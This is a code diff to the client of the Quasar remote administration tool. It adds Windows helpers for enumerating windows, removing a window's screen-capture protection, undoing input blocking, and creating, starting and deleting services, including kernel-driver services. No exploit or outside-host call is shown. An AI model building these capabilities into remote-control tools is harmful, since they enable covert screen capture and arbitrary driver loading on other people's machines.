@@ -1,8 +1,12 @@
-﻿using Quasar.Client.Utilities;
+﻿using Microsoft.Win32.SafeHandles;
+using Quasar.Client.Utilities;
 using System;
+using System.Collections.Generic;
+using System.ComponentModel;
 using System.Drawing;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 
 namespace Quasar.Client.Helper
 {
@@ -150,6 +154,7 @@ namespace Quasar.Client.Helper
         private const int WM_CLOSE = 16;
         private const uint SPI_SETSCREENSAVEACTIVE = 0x0011;
         private const uint SPIF_SENDWININICHANGE = 0x0002;
+        private const uint WDA_NONE = 0x0;
 
         public static void DisableScreensaver()
         {
@@ -193,5 +198,273 @@ namespace Quasar.Client.Helper
 
             return sbTitle.ToString();
         }
+
+        public static bool TryGetWindowProcessId(IntPtr handle, out int processId)
+        {
+            processId = 0;
+            try
+            {
+                if (NativeMethods.GetWindowThreadProcessId(handle, out uint pid) != 0)
+                {
+                    processId = (int)pid;
+                    return true;
+                }
+            }
+            catch
+            {
+                // ignored – treat as failure
+            }
+
+            return false;
+        }
+
+        public static IEnumerable<IntPtr> EnumerateProcessWindows(int processId, bool includeChildWindows)
+        {
+            var handles = new List<IntPtr>();
+
+            NativeMethods.EnumWindows((hWnd, _) =>
+            {
+                if (!NativeMethods.IsWindow(hWnd))
+                    return true;
+
+                if (TryGetWindowProcessId(hWnd, out var ownerPid) && ownerPid == processId)
+                {
+                    handles.Add(hWnd);
+                    if (includeChildWindows)
+                        handles.AddRange(EnumerateChildWindows(hWnd));
+                }
+
+                return true;
+            }, IntPtr.Zero);
+
+            return handles;
+        }
+
+        public static IEnumerable<IntPtr> EnumerateChildWindows(IntPtr parent)
+        {
+            var children = new List<IntPtr>();
+            if (parent == IntPtr.Zero)
+                return children;
+
+            NativeMethods.EnumChildWindows(parent, (hWnd, _) =>
+            {
+                if (NativeMethods.IsWindow(hWnd))
+                    children.Add(hWnd);
+                return true;
+            }, IntPtr.Zero);
+
+            return children;
+        }
+
+        public static WindowAffinityResetResult ResetWindowDisplayAffinity(IntPtr handle, bool skipIfAlreadyReset, out int errorCode)
+        {
+            errorCode = 0;
+
+            if (handle == IntPtr.Zero)
+                return WindowAffinityResetResult.Failed;
+
+            if (skipIfAlreadyReset)
+            {
+                try
+                {
+                    if (NativeMethods.GetWindowDisplayAffinity(handle, out uint currentAffinity) && currentAffinity == WDA_NONE)
+                        return WindowAffinityResetResult.Skipped;
+                }
+                catch
+                {
+                    // Not all OS builds support GetWindowDisplayAffinity – fall back to best effort.
+                }
+            }
+
+            if (NativeMethods.SetWindowDisplayAffinity(handle, WDA_NONE))
+                return WindowAffinityResetResult.ResetPerformed;
+
+            errorCode = Marshal.GetLastWin32Error();
+            return WindowAffinityResetResult.Failed;
+        }
+
+        public static bool TryResetBlockInput(int attempts, int delayMilliseconds, out int errorCode)
+        {
+            errorCode = 0;
+            attempts = Math.Max(1, attempts);
+
+            for (int i = 0; i < attempts; i++)
+            {
+                if (NativeMethods.BlockInput(false))
+                    return true;
+
+                errorCode = Marshal.GetLastWin32Error();
+                Thread.Sleep(Math.Max(1, delayMilliseconds));
+            }
+
+            return false;
+        }
+
+        public enum WindowAffinityResetResult
+        {
+            ResetPerformed,
+            Skipped,
+            Failed
+        }
+
+        #region Service control helpers
+
+        public sealed class SafeServiceHandle : SafeHandleZeroOrMinusOneIsInvalid
+        {
+            public SafeServiceHandle() : base(true)
+            {
+            }
+
+            public SafeServiceHandle(IntPtr existingHandle) : base(true)
+            {
+                SetHandle(existingHandle);
+            }
+
+            protected override bool ReleaseHandle()
+            {
+                return NativeMethods.CloseServiceHandle(handle);
+            }
+        }
+
+        public static bool TryOpenServiceManager(NativeMethods.ScmAccessRights accessRights, out SafeServiceHandle handle, out int error)
+        {
+            var raw = NativeMethods.OpenSCManager(null, null, accessRights);
+            if (raw == IntPtr.Zero)
+            {
+                error = Marshal.GetLastWin32Error();
+                handle = null;
+                return false;
+            }
+
+            handle = new SafeServiceHandle(raw);
+            error = 0;
+            return true;
+        }
+
+        public static bool TryOpenService(SafeServiceHandle manager, string serviceName, NativeMethods.ServiceAccessRights desiredAccess, out SafeServiceHandle service, out int error)
+        {
+            service = null;
+            error = 0;
+
+            if (manager == null || manager.IsInvalid)
+            {
+                error = NativeMethods.ERROR_SERVICE_DOES_NOT_EXIST;
+                return false;
+            }
+
+            var raw = NativeMethods.OpenService(manager.DangerousGetHandle(), serviceName, desiredAccess);
+            if (raw == IntPtr.Zero)
+            {
+                error = Marshal.GetLastWin32Error();
+                return false;
+            }
+
+            service = new SafeServiceHandle(raw);
+            return true;
+        }
+
+        public static bool TryCreateKernelDriverService(SafeServiceHandle manager, string serviceName, string displayName, string driverPath, out SafeServiceHandle service, out int error)
+        {
+            service = null;
+            error = 0;
+
+            if (manager == null || manager.IsInvalid)
+            {
+                error = NativeMethods.ERROR_SERVICE_DOES_NOT_EXIST;
+                return false;
+            }
+
+            var raw = NativeMethods.CreateService(
+                manager.DangerousGetHandle(),
+                serviceName,
+                displayName,
+                NativeMethods.ServiceAccessRights.AllAccess,
+                NativeMethods.ServiceType.KernelDriver,
+                NativeMethods.ServiceStartType.Manual,
+                NativeMethods.ServiceErrorControl.Normal,
+                driverPath,
+                null,
+                IntPtr.Zero,
+                null,
+                null,
+                null);
+
+            if (raw == IntPtr.Zero)
+            {
+                error = Marshal.GetLastWin32Error();
+                return false;
+            }
+
+            service = new SafeServiceHandle(raw);
+            return true;
+        }
+
+        public static bool TryDeleteService(SafeServiceHandle service, out int error)
+        {
+            error = 0;
+            if (service == null || service.IsInvalid)
+                return false;
+
+            if (!NativeMethods.DeleteService(service.DangerousGetHandle()))
+            {
+                error = Marshal.GetLastWin32Error();
+                return false;
+            }
+
+            return true;
+        }
+
+        public static bool TryStartService(SafeServiceHandle service, out int error)
+        {
+            error = 0;
+            if (service == null || service.IsInvalid)
+                return false;
+
+            if (!NativeMethods.StartService(service.DangerousGetHandle(), 0, IntPtr.Zero))
+            {
+                error = Marshal.GetLastWin32Error();
+                return false;
+            }
+
+            return true;
+        }
+
+        public static bool TryStopService(SafeServiceHandle service, out int error)
+        {
+            error = 0;
+            if (service == null || service.IsInvalid)
+                return false;
+
+            var status = new NativeMethods.SERVICE_STATUS();
+            if (!NativeMethods.ControlService(service.DangerousGetHandle(), NativeMethods.ServiceControl.Stop, ref status))
+            {
+                error = Marshal.GetLastWin32Error();
+                return false;
+            }
+
+            return true;
+        }
+
+        public static NativeMethods.SERVICE_STATUS_PROCESS QueryServiceStatus(SafeServiceHandle service)
+        {
+            if (service == null || service.IsInvalid)
+                throw new InvalidOperationException("Service handle is invalid.");
+
+            int size = Marshal.SizeOf(typeof(NativeMethods.SERVICE_STATUS_PROCESS));
+            IntPtr buffer = Marshal.AllocHGlobal(size);
+            try
+            {
+                if (!NativeMethods.QueryServiceStatusEx(service.DangerousGetHandle(), NativeMethods.SC_STATUS_PROCESS_INFO, buffer, (uint)size, out _))
+                    throw new Win32Exception(Marshal.GetLastWin32Error());
+
+                return (NativeMethods.SERVICE_STATUS_PROCESS)Marshal.PtrToStructure(buffer, typeof(NativeMethods.SERVICE_STATUS_PROCESS));
+            }
+            finally
+            {
+                Marshal.FreeHGlobal(buffer);
+            }
+        }
+
+        #endregion
     }
 }
